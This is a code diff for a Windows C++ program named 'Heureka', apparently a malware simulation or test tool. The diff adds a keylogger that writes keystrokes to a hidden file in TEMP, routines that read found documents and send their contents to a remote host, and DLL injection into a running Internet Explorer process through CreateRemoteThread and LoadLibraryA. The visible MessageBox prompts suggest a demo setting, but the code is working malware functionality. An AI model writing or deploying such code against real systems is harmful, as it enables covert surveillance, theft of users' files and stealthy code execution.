@@ -1,4 +1,3 @@
-#pragma comment(lib, "winhttp.lib")
 #include<iostream>
 #include<Windows.h>
 #include<winhttp.h>
@@ -35,19 +34,48 @@ void print_error(char* fmt,...){
 
 // Task functions
 #if HOOK_KEYBOARD==1
+HANDLE hFile;
 LRESULT CALLBACK hook_proc( int code, WPARAM wParam, LPARAM lParam ){
 	KBDLLHOOKSTRUCT*  kbd = (KBDLLHOOKSTRUCT*)lParam;
+	DWORD dwWritten;
 	if (  code < 0||   (kbd->flags & 0x10)) return CallNextHookEx( NULL, code, wParam, lParam );
-	print_status("Key pressed: %X",kbd->vkCode);
+	
+	WriteFile(hFile, &kbd->vkCode, 1,&dwWritten,NULL);
+	print_status("Key pressed: %X (%d)",kbd->vkCode,dwWritten);
 	return CallNextHookEx( NULL, code, wParam, lParam );
 }
 
 void hook_keyboard(){
 	print_status("hook_keyboard begins");
+	
+	TCHAR tmppath[MAX_PATH];
+	
+	ZeroMemory(tmppath,MAX_PATH);
+	DWORD err=GetTempPath(MAX_PATH,tmppath);
+	if (err>MAX_PATH || err==0){
+		print_error("Unable to retreive TEMP path");
+		return;
+	}
+	if (strcat_s(tmppath,MAX_PATH,"heureka.log")!=0){
+		print_error("Unable to generate TEMP filename");
+	}
+	print_status("Generated filename: %s",tmppath);
+	
+	hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
+	if (hFile==INVALID_HANDLE_VALUE){
+		print_error("Unable to create file in TEMP (%d)",GetLastError());
+		return;
+	}
+	print_status("Created keylog: %s",tmppath);
+
 	HHOOK thehook = SetWindowsHookEx( WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0 );
 	print_status("Hook set, waiting for input");
+	
 	MessageBox(NULL, "Keylogger is running", "Heureka", MB_OK);
+	
+	CloseHandle(hFile);
 	UnhookWindowsHookEx(thehook);
+	
 	print_status("hook_keyboard ends");
 }
 #endif
@@ -147,6 +175,26 @@ void search_docs(){
 			{
 				do{
 					print_status("File found: %s", FindFileData.cFileName);
+#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+					DWORD dwBytesRead = 0;
+					char ReadBuffer[10240] = {0};
+					TCHAR filePath[MAX_PATH];
+					StringCbPrintf(filePath,MAX_PATH,"%s\\%s",search_path,FindFileData.cFileName);
+					HANDLE hFile=CreateFile(filePath,FILE_GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+					
+					if (hFile==INVALID_HANDLE_VALUE){
+						print_error("Unable to open file for reading (%d): %s",GetLastError(),filePath);
+						continue;
+					}
+
+					if( FALSE == ReadFile(hFile, ReadBuffer, 10240-1, &dwBytesRead, NULL) )
+					{
+						print_error("Unable to read from file");
+					}
+					print_status("Sendind %d bytes",dwBytesRead);
+					web_send_recv((unsigned char*)ReadBuffer,dwBytesRead);
+					CloseHandle(hFile);
+#endif
 				}while (FindNextFile(hFind, &FindFileData) != 0);
 				FindClose(hFind);
 			}
@@ -238,35 +286,74 @@ void dll_inject_ie(){
 	ZeroMemory(&si,sizeof(si));
 	si.cb=sizeof(si);
 	ZeroMemory(&pi,sizeof(pi));
-	
-	if( !CreateProcess( IE_PATH,   
-        "",				// Command line
-        NULL,           // Process handle not inheritable
-        NULL,           // Thread handle not inheritable
-        FALSE,          // Set handle inheritance to FALSE
-        0,              // No creation flags
-        NULL,           // Use parent's environment block
-        NULL,           // Use parent's starting directory 
-        &si,            // Pointer to STARTUPINFO structure
-        &pi )           // Pointer to PROCESS_INFORMATION structure
-    ) 
-    {
-        print_error( "CreateProcess failed (IE)");
-        return;
-    }	
-	print_status("IE process created");
 
-	void* pLibRemote=VirtualAllocEx(pi.hProcess, NULL, sizeof(HEUREKADLL_PATH),MEM_COMMIT, PAGE_READWRITE );
-	WriteProcessMemory(pi.hProcess, pLibRemote, (void*)HEUREKADLL_PATH,sizeof(HEUREKADLL_PATH), NULL );
+	DWORD aProcesses[1024], cbNeeded, cProcesses;
+    HANDLE hP=NULL;
+	DWORD hPid=0;
+
+    if(EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
+    {
+		cProcesses = cbNeeded / sizeof(DWORD);
+		for (unsigned int i = 0; i < cProcesses; i++ ){
+			if( aProcesses[i] != 0 )
+			{
+				TCHAR szProcessName[MAX_PATH];
+				HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
+				if (NULL != hProcess )
+				{
+					HMODULE hMod;
+					DWORD cbNeeded;
+
+					if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ){
+						GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
+					}
+					if (strstr(szProcessName,"iexplore")){
+						
+						hPid=aProcesses[i];
+						hP=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,hPid);
+						print_status("Found IE Process: %d",hPid);
+						CloseHandle(hProcess);
+						break;
+					}
+					CloseHandle(hProcess);
+				}
+				
+			}
+		}
+    }
+	if (hP==NULL){
+		if( !CreateProcess( IE_PATH,   
+			"",				// Command line
+			NULL,           // Process handle not inheritable
+			NULL,           // Thread handle not inheritable
+			FALSE,          // Set handle inheritance to FALSE
+			0,              // No creation flags
+			NULL,           // Use parent's environment block
+			NULL,           // Use parent's starting directory 
+			&si,            // Pointer to STARTUPINFO structure
+			&pi )           // Pointer to PROCESS_INFORMATION structure
+		) 
+		{
+			print_error( "CreateProcess failed (IE)");
+			return;
+		}	
+		print_status("IE process created with PID: %d",pi.dwProcessId);
+		hP=pi.hProcess;
+		hPid=pi.dwProcessId;
+	}
+	print_status("Process handle: %p",hP);
+	void* pLibRemote=VirtualAllocEx(hP, NULL, sizeof(HEUREKADLL_PATH),MEM_COMMIT, PAGE_READWRITE );
+	WriteProcessMemory(hP, pLibRemote, (void*)HEUREKADLL_PATH,sizeof(HEUREKADLL_PATH), NULL );
 	
-	HANDLE hThread=CreateRemoteThread( pi.hProcess, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );
-	
+	HANDLE hThread=CreateRemoteThread( hP, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );
+	print_status("Remote Thread: %p", hThread);
+	MessageBox(NULL, TEXT("Heureka inject"),TEXT("Heureka"),MB_OK);
 	WaitForSingleObject( hThread, INFINITE );
 	CloseHandle(hThread);
 	
-	WaitForSingleObject(pi.hProcess, INFINITE );
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
+	WaitForSingleObject(hP, INFINITE );
+	CloseHandle(hP);
+	//CloseHandle(pi.hThread);
 	print_status("dll_inject_ie ends");
 }
 #endif
